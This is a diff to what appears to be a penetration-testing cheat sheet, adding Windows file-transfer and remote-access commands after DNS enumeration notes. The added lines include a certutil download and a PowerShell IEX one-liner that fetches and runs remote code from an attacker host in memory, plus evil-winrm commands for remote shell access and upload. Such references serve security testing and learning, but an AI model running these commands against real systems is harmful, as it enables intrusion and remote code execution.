@@ -364,10 +364,24 @@ responder -I eth0 -rdwv
 DNSRecon - is a powerful DNS enumeration script
 ```
 dnsrecon -d <IP> -t axfr
-
-#with metasploit
-use auxiliary/gather/enum_dns
+use auxiliary/gather/enum_dns #with metasploit
 ```
+
+upload file with cmd
+```
+certutil -split -f -urlcache http://<your IP>/file_to_download
+powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<your_ip>/<file>")' #execute file without download (!!)
+```
+
+evil-winrm - Windows Remote Management (if 5985 or 5986 ports are open)
+```
+evil-winrm -u <username> -p <password> -i <ip>
+upload <file on your ps directory> #to upload file
+```
+
+</details>
+
+<details><summary>Priv esc</summary>
 
 </details>
 
